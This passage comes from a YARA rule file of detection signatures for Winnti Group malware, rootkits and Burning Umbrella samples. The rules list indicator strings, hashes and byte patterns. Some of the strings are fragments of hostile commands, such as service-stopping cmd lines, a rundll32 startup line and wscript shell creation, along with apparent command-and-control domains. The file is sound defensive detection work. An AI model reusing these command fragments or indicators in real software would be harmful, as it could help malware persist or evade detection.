= \".?AVPSCL_CLASS_JOB_SAVE_CONFIG@@\" fullword ascii\n        $s5 = \"winupdate64.com\" fullword ascii\n        $s6 = \"Job Save KeyLogger\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them)\n}\n\nrule Winnti_signing_cert\n{\n    meta:\n        description = \"Signing certificate used by the Winnti APT group\"\n        ref = \"https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Winnti_signing_cert\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Guangzhou YuanLuo Technology Co.\" ascii\n        $s2 = \"Guangzhou YuanLuo Technology Co.,Ltd\" ascii\n        $s3 = \"$Asahi Kasei Microdevices Corporation0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule Winnti_malware_Nsiproxy\n{\n    meta:\n        description = \"Winnti rootkit\"\n        threat_names = \"Winnti, Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Winnti_malware_Nsiproxy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"\\\\Driver\\\\nsiproxy\" fullword wide\n        $a1 = \"\\\\Device\\\\StreamPortal\" fullword wide\n        $a2 = \"\\\\Device\\\\PNTFILTER\" fullword wide\n        $s1 = \"Cookie: SN=\" fullword ascii\n        $s2 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" fullword wide\n        $s3 = \"Winqual.sys\" fullword wide\n        $s4 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\" fullword wide\n        $s5 = \"http://www.wasabii.com.tw 0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and $x1 and 1 of ($a*) and 2 of ($s*)\n}\n\nrule Winnti_malware_UpdateDLL\n{\n    meta:\n        description = \"Winnti malware - Update.dll\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Winnti_malware_UpdateDLL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $c1 = \"'Wymajtec$Tima Stempijg Sarviges GA -$G2\" fullword ascii\n        $c2 = \"AHDNEAFE1.sys\" fullword ascii\n        $c3 = \"SOTEFEHJ3.sys\" fullword ascii\n        $c4 = \"MainSYS64.sys\" fullword ascii\n        $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword wide\n        $s2 = \"Update.dll\" fullword ascii\n        $s3 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n        $s4 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n        $s5 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" fullword wide\n        $s6 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n        $s7 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n        $s8 = \"HOST: %s\" fullword ascii\n        $s9 = \"$$$--Hello\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and ((1 of ($c*) and 3 of ($s*)) or all of ($s*))\n}\n\nrule Winnti_malware_FWPK\n{\n    meta:\n        description = \"Winnti malware - FWPKCLNT.SYS\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Winnti_malware_FWPK\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\\\" fullword wide\n        $s1 = \"%x:%d->%x:%d, Flag %s%s%s%s%s, seq %u, ackseq %u, datalen %u\" fullword ascii\n        $s2 = \"FWPKCLNT.SYS\" fullword ascii\n        $s3 = \"Port Layer\" fullword wide\n        $s4 = \"%x->%x, icmp type %d, code %d\" fullword ascii\n        $s5 = \"\\\\BaseNamedObjects\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28E}\" fullword wide\n        $s6 = \"\\\\Ndi\\\\Interfaces\" fullword wide\n        $s7 = \"\\\\Device\\\\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}\" fullword wide\n        $s8 = \"Bad packet\" fullword ascii\n        $s9 = \"\\\\BaseNamedObjects\\\\EKV0000000000\" fullword wide\n        $s10 = \"%x->%x\" fullword ascii\n        $s11 = \"IPInjectPkt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 642KB and all of them\n}\n\nrule Winnti_malware_StreamPortal_Gen\n{\n    meta:\n        description = \"Winnti malware - Streamportal\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Winnti_malware_StreamPortal_Gen\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Proxies destination address/port for TCP\" fullword wide\n        $s3 = \"\\\\Device\\\\StreamPortal\" fullword wide\n        $s4 = \"Transport-Data Proxy Sub-Layer\" fullword wide\n        $s5 = \"Cookie: SN=\" fullword ascii\n        $s6 = \"\\\\BaseNamedObjects\\\\_transmition_synchronization_\" fullword wide\n        $s17 = \"NTOSKRNL.EXE\" fullword wide\n        $s19 = \"FwpsReferenceNetBufferList0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 275KB and all of them\n}\n\nrule Winnti_Pharma\n{\n    meta:\n        description = \"Backdoor Win64 Winnti Pharma\"\n        ref = \"https://securelist.com/blog/research/70991/games-are-over/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jose Ramon Palanco\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WinntiPharma\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Cookie: SN=\"\n        $s1 = \"{3ec05b4a-ea88-1378-3389-66706ba27600}\"\n        $s2 = \"{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n        $s3 = \"master secret\"\n        $s4 = \"MyEngineNetEvent\"\n\n    condition:\n        all of ($s*)\n}\n\nrule Winnti_fonfig\n{\n    meta:\n        description = \"Winnti sample (file: fonfig.exe)\"\n        ref = \"https://goo.gl/VbvJtL\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Winnti_fonfig\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"mciqtz.exe\" fullword wide\n        $s2 = \"knat9y7m\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule Winnti_NlaifSvc\n{\n    meta:\n        description = \"Winnti sample (file: NlaifSvc.dll)\"\n        ref = \"https://goo.gl/VbvJtL\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Winnti_NlaifSvc\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cracked by ximo\" ascii\n        $s1 = \"Yqrfpk\" fullword ascii\n        $s2 = \"IVVTOC\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and (1 of ($x*) or 2 of them)) or (3 of them)\n}\n\nrule Winnti_HDRoot_Sample_Jul17_1\n{\n    meta:\n        description = \"HDRoot samples\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HDRoot_Sample_Jul17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"gleupdate.dll\" fullword ascii\n        $s2 = \"\\\\DosDevices\\\\%ws\\\\system32\\\\%ws\" fullword wide\n        $s3 = \"l\\\\Driver\\\\nsiproxy\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 60KB and 3 of them)\n}\n\nrule Winnti_HDRoot_Sample_Jul17_2\n{\n    meta:\n        description = \"HDRoot samples\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HDRoot_Sample_Jul17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"http://microsoftcompanywork.htm\" fullword ascii\n        $x2 = \"compose.aspx?s=%4X%4X%4X%4X%4X%4X\" fullword ascii\n        $t1 = \"http://babelfish.yahoo.com/translate_url?\" fullword ascii\n        $t2 = \"http://translate.google.com/translate?prev=hp&hl=en&js=n&u=%s?%d&sl=es&tl=en\" fullword ascii\n        $u1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.5.\" ascii\n        $u2 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)\" fullword ascii\n        $u3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; TERA:\" fullword ascii\n        $s1 = \"\\\\system32\\\\ntoskrnl.exe\" fullword ascii\n        $s2 = \"Schedsvc.dll\" fullword wide\n        $s3 = \"dllserver64.dll\" fullword ascii\n        $s4 = \"C:\\\\TERA_SR.txt\" fullword ascii\n        $s5 = \"updatevnsc.dat\" fullword wide\n        $s6 = \"tera dll service global event\" fullword ascii\n        $s7 = \"Referer: http://%s/%s\" fullword ascii\n        $s8 = \"tera replace dll config\" fullword ascii\n        $s9 = \"SetupDll64.dll\" fullword ascii\n        $s10 = \"copy %%ComSpec%% \\\"%s\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (1 of ($x*) or all of ($u*) or 8 of them)\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_1\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = { 40 00 00 E0 75 68 66 61 6F 68 6C 79 }\n        $s2 = { 40 00 00 E0 64 6A 7A 66 63 6D 77 62 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and (pe.imphash() == \"baa93d47220682c04d92f7797d9224ce\" and $s1 in (0 .. 1024) and $s2 in (0 .. 1024))\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_2\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = { 40 00 00 E0 63 68 72 6F 6D 67 75 78 }\n        $s2 = { 40 00 00 E0 77 62 68 75 74 66 6F 61 }\n        $s3 = \"ActiveX Manager\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and $s1 in (0 .. 1024) and $s2 in (0 .. 1024) and $s3\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_3\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"HKEY_CLASSES_ROOT\\\\Word.Document.8\\\\shell\\\\Open\\\\command\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_4\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"dumpodbc.exe\" fullword ascii\n        $x2 = \"photo_Bundle.exe\" fullword ascii\n        $x3 = \"Connect 2 fails : %d,%s:%d\" fullword ascii\n        $x4 = \"Connect fails 1 : %d %s:%d\" fullword ascii\n        $x5 = \"New IP : %s,New Port: %d\" fullword ascii\n        $x6 = \"Micrsoft Corporation. All rights reserved.\" fullword wide\n        $x7 = \"New ConFails : %d\" fullword ascii\n        $s1 = \"cmd /c net stop stisvc\" fullword ascii\n        $s2 = \"cmd /c net stop spooler\" fullword ascii\n        $s3 = \"\\\\temp\\\\s%d.dat\" fullword ascii\n        $s4 = \"cmd /c net stop wuauserv\" fullword ascii\n        $s5 = \"User-Agent: MyApp/0.1\" fullword ascii\n        $s6 = \"%s->%s Fails : %d\" fullword ascii\n        $s7 = \"Enter WorkThread,Current sock:%d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and ((pe.exports(\"Print32\") and 2 of them) or 1 of ($x*) or 4 of them)\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_6\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"ExecuteFile=\\\"hidcon:nowait:\\\\\\\"Word\\\\\\\\r.bat\\\\\\\"\\\"\" fullword ascii\n        $s2 = \"InstallPath=\\\"%Appdata%\\\\\\\\Microsoft\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_7\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and pe.imphash() == \"f5b113d6708a3927b5cc48f2215fcaff\"\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_8\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_8\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd /c open %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_10\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_10\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"revjj.syshell.org\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_11\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_11\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Resume.app/Contents/Java/Resume.jarPK\" fullword ascii\n\n    condition:\n        uint16(0) == 0x4b50 and filesize < 700KB and 1 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_12\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_12\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%SystemRoot%\\\\System32\\\\qmgr.dll\" fullword ascii\n        $s2 = \"rundll32.exe %s,Startup\" fullword ascii\n        $s3 = \"nvsvcs.dll\" fullword wide\n        $s4 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\BITS\\\\Parameters\" fullword ascii\n        $s5 = \"http://www.sginternet.net 0\" fullword ascii\n        $s6 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 80KB and (pe.exports(\"SvcServiceMain\") and 5 of them)\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_13\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_13\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == \"75f201aa8b18e1c4f826b2fe0963b84f\"\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_14\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_14\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\tmp\\\\Google_updata.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_15\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_15\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and pe.imphash() == \"cc33b1500354cf785409a3b428f7cd2a\"\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_16\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_16\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://netimo.net 0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_17\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"syshell\" fullword wide\n        $s2 = \"Normal.dotm\" fullword ascii\n        $s3 = \"Microsoft Office Word\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_18\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_18\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\tmp\\\\tran.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (pe.imphash() == \"11675b4db0e7df7b29b1c1ef6f88e2e1\" or pe.imphash() == \"364e1f68e2d412db34715709c68ba467\" or pe.exports(\"deKernel\") or 1 of them)\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_19\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_19\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Cryption.dll\" fullword ascii\n        $s2 = \"tran.exe\" fullword ascii\n        $s3 = \"Kernel.dll\" fullword ascii\n        $s4 = \"Now ready to get the file %s!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_20\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_20\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Wordpad.Document.1\\\\shell\\\\open\\\\command\\\\\" fullword wide\n        $s2 = \"%s\\\\shell\\\\Open\\\\command\" fullword wide\n        $s3 = \"expanding computer\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and (pe.imphash() == \"bac338bfe2685483c201e15eae4352d5\" or 2 of them)\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_21\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_21\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\windows\\\\ime\\\\setup.exe\" fullword ascii\n        $s2 = \"ws.run \\\"later.bat /start\\\",0Cet \" fullword ascii\n        $s3 = \"del later.bat\" fullword ascii\n        $s4 = \"mycrs.xls\" fullword ascii\n        $a1 = \"-el -s2 \\\"-d%s\\\" \\\"-p%s\\\" \\\"-sp%s\\\"\" fullword ascii\n        $a2 = \"<set ws=wscript.createobject(\\\"wscript.shell\\\")\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 2 of them\n}\n\nrule Winnti_MAL_BurningUmbrella_Sample_22\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_BurningUmbrella_Sample_22\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\\" fullword ascii\n        $s2 = 